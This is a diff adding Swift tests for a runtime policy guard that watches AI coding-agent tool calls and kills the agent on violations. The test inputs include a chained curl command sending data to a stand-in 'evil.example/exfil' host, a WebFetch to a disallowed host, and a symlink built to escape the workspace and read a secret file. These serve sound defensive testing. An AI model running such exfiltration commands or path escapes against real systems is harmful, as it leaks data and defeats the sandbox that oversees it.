@@ -584,6 +584,134 @@ struct RuntimePolicyGuardTests {
         #expect(shouldKill == true)
         #expect(monitor.policyViolation == true)
     }
+
+    @Test("Mutating tool without observable path stops the provider")
+    func mutationWithoutPathStopsProvider() {
+        let manifest = runtimePolicyManifest(allowedTools: ["Write"])
+        let monitor = AgentRuntimeWorker.ProcessMonitor(
+            tokenBudget: Int.max,
+            taskID: manifest.taskID,
+            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
+        )
+
+        let shouldKill = monitor.processEvent(
+            .toolUse(name: "Write", id: "t1", input: [:]),
+            process: nil
+        )
+
+        #expect(shouldKill == true)
+        #expect(monitor.policyViolation == true)
+        #expect(monitor.policyViolationMessage?.contains("could not validate the file path") == true)
+    }
+
+    @Test("Network destination outside allow-list stops the provider")
+    func networkOutsideAllowListStopsProvider() {
+        let manifest = runtimePolicyManifest(
+            allowedTools: ["WebFetch"],
+            allowedURLPatterns: ["https://allowed.example/*"]
+        )
+        let monitor = AgentRuntimeWorker.ProcessMonitor(
+            tokenBudget: Int.max,
+            taskID: manifest.taskID,
+            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
+        )
+
+        let shouldKill = monitor.processEvent(
+            .toolUse(name: "WebFetch", id: "t1", input: ["url": "https://evil.example/data"]),
+            process: nil
+        )
+
+        #expect(shouldKill == true)
+        #expect(monitor.policyViolation == true)
+        #expect(monitor.policyViolationMessage?.contains("outside the URL allow-list") == true)
+    }
+
+    @Test("Every URL in shell network commands must satisfy the allow-list")
+    func shellCommandWithSecondURLOutsideAllowListStopsProvider() {
+        let manifest = runtimePolicyManifest(
+            allowedTools: ["Bash"],
+            allowedURLPatterns: ["https://allowed.example/*"]
+        )
+        let monitor = AgentRuntimeWorker.ProcessMonitor(
+            tokenBudget: Int.max,
+            taskID: manifest.taskID,
+            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
+        )
+
+        let shouldKill = monitor.processEvent(
+            .toolUse(
+                name: "Bash",
+                id: "t1",
+                input: [
+                    "command": "curl https://allowed.example/status && curl https://evil.example/exfil"
+                ]
+            ),
+            process: nil
+        )
+
+        #expect(shouldKill == true)
+        #expect(monitor.policyViolation == true)
+        #expect(monitor.policyViolationMessage?.contains("outside the URL allow-list") == true)
+    }
+
+    @Test("Specific URL deny patterns stop the provider")
+    func specificURLDenyPatternStopsProvider() {
+        let manifest = runtimePolicyManifest(
+            allowedTools: ["Bash"],
+            deniedURLPatterns: ["https://evil.example/*"]
+        )
+        let monitor = AgentRuntimeWorker.ProcessMonitor(
+            tokenBudget: Int.max,
+            taskID: manifest.taskID,
+            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
+        )
+
+        let shouldKill = monitor.processEvent(
+            .toolUse(
+                name: "Bash",
+                id: "t1",
+                input: ["command": "curl https://evil.example/data"]
+            ),
+            process: nil
+        )
+
+        #expect(shouldKill == true)
+        #expect(monitor.policyViolation == true)
+        #expect(monitor.policyViolationMessage?.contains("denied URL pattern") == true)
+    }
+
+    @Test("Symlinked paths escaping workspace stop the provider")
+    func symlinkPathEscapeStopsProvider() throws {
+        let root = FileManager.default.temporaryDirectory
+            .appendingPathComponent("astra-policy-root-\(UUID().uuidString)", isDirectory: true)
+        let outside = FileManager.default.temporaryDirectory
+            .appendingPathComponent("astra-policy-outside-\(UUID().uuidString)", isDirectory: true)
+        let link = root.appendingPathComponent("linked-outside", isDirectory: true)
+        let secret = link.appendingPathComponent("secret.txt")
+        defer {
+            try? FileManager.default.removeItem(at: root)
+            try? FileManager.default.removeItem(at: outside)
+        }
+        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+        try FileManager.default.createDirectory(at: outside, withIntermediateDirectories: true)
+        try Data("secret".utf8).write(to: outside.appendingPathComponent("secret.txt"))
+        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: outside)
+
+        let manifest = runtimePolicyManifest(allowedTools: ["Read"], workspacePath: root.path)
+        let monitor = AgentRuntimeWorker.ProcessMonitor(
+            tokenBudget: Int.max,
+            taskID: manifest.taskID,
+            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
+        )
+
+        let shouldKill = monitor.processEvent(
+            .toolUse(name: "Read", id: "t1", input: ["file_path": secret.path]),
+            process: nil
+        )
+
+        #expect(shouldKill == true)
+        #expect(monitor.policyViolation == true)
+    }
 }
 
 private func runtimePolicyManifest(
@@ -592,7 +720,8 @@ private func runtimePolicyManifest(
     allowedShellPatterns: [String] = [],
     deniedShellPatterns: [String] = [],
     allowedURLPatterns: [String] = [],
-    deniedURLPatterns: [String] = []
+    deniedURLPatterns: [String] = [],
+    workspacePath: String = "/tmp/astra-policy-guard"
 ) -> RunPermissionManifest {
     let render = ProviderPolicyRender(
         providerID: .claudeCode,
@@ -624,7 +753,7 @@ private func runtimePolicyManifest(
         policyLevel: .review,
         policyScope: .taskOverride,
         providerRender: render,
-        workspacePath: "/tmp/astra-policy-guard",
+        workspacePath: workspacePath,
         additionalPaths: [],
         environmentKeyNames: [],
         credentialLabels: [],
